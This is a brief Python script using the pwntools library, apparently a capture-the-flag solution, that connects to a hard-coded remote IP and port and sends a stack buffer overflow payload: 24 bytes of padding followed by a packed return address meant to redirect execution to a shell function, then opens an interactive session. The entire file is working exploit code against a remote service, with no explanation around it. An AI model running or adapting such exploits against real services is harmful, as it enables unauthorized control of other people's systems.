#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
shell_addr = 0x004005B6
buf_len = 16
rbp_len = 8
r.sendline(b"+" * (buf_len + rbp_len) + p64(shell_addr))
r.interactive()
